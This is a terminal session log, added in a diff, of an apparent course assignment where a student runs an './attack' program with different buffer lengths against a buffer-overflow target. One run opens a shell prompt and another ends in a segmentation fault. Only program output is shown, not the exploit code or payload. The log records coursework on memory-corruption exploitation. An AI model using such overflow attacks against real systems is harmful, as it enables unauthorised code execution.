@@ -1,0 +1,53 @@
+Script started on Thu 30 Mar 2017 08:53:59 PM EDT
+hkocabas@js-156-93:~/testassignment2/part4$ ./attack 1041 10001
+
+Using address as guess for beginning of attack buffer: 0x831ae28f
+
+Length of Input String:1040
+
+
+Value of Test:cae2a3c8
+Value of filename[0]:cae29fc0
+
+You are going to need a buffer a little larger than:1032
+
+$ 
+$ 
+$ pwd
+/home/hkocabas/testassignment2/part4
+$ date
+Thu Mar 30 20:54:07 EDT 2017
+$ exit
+hkocabas@js-156-93:~/testassignment2/part4$ 
+hkocabas@js-156-93:~/testassignment2/part4$ 
+hkocabas@js-156-93:~/testassignment2/part4$ ./attack 1037 10001
+
+Using address as guess for beginning of attack buffer: 0x3ebde1ef
+
+Length of Input String:1036
+
+
+Value of Test:5629dc08
+Value of filename[0]:5629d800
+
+You are going to need a buffer a little larger than:1032
+
+hkocabas@js-156-93:~/testassignment2/part4$ ./attack 1453 10001
+
+Using address as guess for beginning of attack buffer: 0x30c71dbf
+
+Length of Input String:1452
+
+
+Value of Test:9d7c8568
+Value of filename[0]:9d7c8160
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+hkocabas@js-156-93:~/testassignment2/part4$ 
+hkocabas@js-156-93:~/testassignment2/part4$ 
+hkocabas@js-156-93:~/testassignment2/part4$ exit
+exit
+
+Script done on Thu 30 Mar 2017 08:54:40 PM EDT
